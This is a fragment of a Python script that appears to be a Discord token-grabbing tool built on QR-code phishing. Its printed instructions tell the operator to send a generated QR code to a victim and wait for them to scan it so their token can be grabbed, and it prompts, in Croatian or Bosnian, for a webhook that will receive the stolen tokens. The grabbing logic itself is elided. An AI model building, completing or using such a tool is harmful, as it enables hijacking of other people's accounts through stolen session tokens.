...
def QR_Grabber(Webhook):
    ...
    print(f"\n{y}[+{y}]{m} Information: \n")
    print(f'          {y}[{Fore.LIGHTCYAN_EX }!{y}]{m} Make sure to have this window open to grab their token!\n')
    print(f'          {y}[{Fore.LIGHTCYAN_EX }!{y}]{m} Send the QR Code to a user and wait for them to scan!\n')
    print(f'          {y}[{Fore.LIGHTCYAN_EX }!{y}]{m} QR Code generated in '+os.getcwd()+'\\output\\QR-Code')
...
fakeqrtitle()
print(f"""{y}[>{y}]{m} POSTAVI WEBHOOK GDJE CE TOKEN BITI POSLANI: """)
webhooklink = input(f"{y}[--->{y}]{m} WEBHOOK INK: ")
print()
